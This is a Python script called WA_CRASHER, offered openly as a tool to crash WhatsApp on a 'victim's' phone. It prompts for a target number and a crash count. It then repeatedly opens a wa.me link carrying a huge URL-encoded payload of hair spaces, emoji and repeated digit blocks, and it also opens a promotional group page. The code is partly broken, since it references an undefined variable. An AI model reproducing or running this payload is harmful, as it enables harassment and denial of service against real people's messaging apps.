# Copyright (c) 2022 X PHANTOM (PH4N70M)

# Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.
###################################
#  X PHANTOM (PH4N70M)            #
#Project : WA_CRASHER             #
#Type    : Whatsapp - Crasher     #
###################################
import os
import colorama
import time
import sys

logo = f"""                                                                                                  
 __    __  _         ___   __    _    __          __  __  
/ / /\ \ \/_\       / __\ /__\  /_\  / _\  /\  /\/__\/__\ 
\ \/  \/ //_\\     / /   / \// //_\\ \ \  / /_/ /_\ / \// 
 \  /\  /  _  \   / /___/ _  \/  _  \_\ \/ __  //__/ _  \ 
  \/  \/\_/ \_/___\____/\/ \_/\_/ \_/\__/\/ /_/\__/\/ \_/ 
             |_____|                                      
                                                   													  
"""
os.system('clear')

def main():
	os.system('clear')
	print(logo)
	print()
	cncode=int(input(f'+ Enter Country Code WithOut "+" eg.91 => '))
	print()
	num=input(f"+ Enter the Victim's Phone number\n\n=> {cncode}  ")
	print()
	crash=int(input(f'+ Enter the number of crashes(Max 15 per 30min) \n\n=> '))
	combnum = f"+{cncode}{num}"
	print()
	Finalcall=input(f' Do You Want To Change NO.{combnum} (Y/N)\n\n=> ')
	if Finalcall == 'Y'  or Finalcall == 'y':
		main()
	elif Finalcall == 'N' or Finalcall == 'n':
		os.system('clear')
		print(f"[+]Crashing Whatsapp on No. : +{cncode}{num} ...")
		time.sleep(5)
		link = (f"""xdg-open https://wa.me/{combnum}/?text=XPHANTOM%20%F0%9F%92%A3%20TeaM%20XPH4N70M%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40XPHANTOM_PH4N70M%F0%9F%A4%A3%0A%F0%9F%94%A5WA_CRASHER%201%20WA_CRASH%20%F0%9F%98%88%0A*NULL%0A*9999999999*%20*X*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*XPHANTOM%20CRATER%20MR%20PH4N70M%20X%C2%B2*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2KILLER-XPHANTOM%F0%9F%92%A3%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*
""")
	for i in range (crash):
		print()
		print(f"[✓] Sending Now\n")
		print(f"[+]{M}Applying 40sec delay...")
		link1 = os.system(link)
		time.sleep(40)
		if link1 == 0:
			print(f" Successful")
			pass
		else:
			print(f"[×] Failed  ")
		time.sleep(0.2)
	return main()

def MSG():
	YTC = input("Have U Join Us ? (Y/N): ")
	if YTC == 'Y' or YTC == 'y':
		print("Thank You For Joining Us...\n")
		time.sleep(4)
		print("Initializing tool...")
		time.sleep(4)		
		print("\n\n")
		main()
	elif YTC == 'N' or YTC == 'n':
		print("")
		os.system("xdg-open https://hackerxphantom.blogspot.com/p/join-whatsapp-group.html")
		time.sleep(8)
		os.system("xdg-open https://hackerxphantom.blogspot.com/p/join-whatsapp-group.html")
		time.sleep(3)
		print("\n\n")
		main()

MSG()
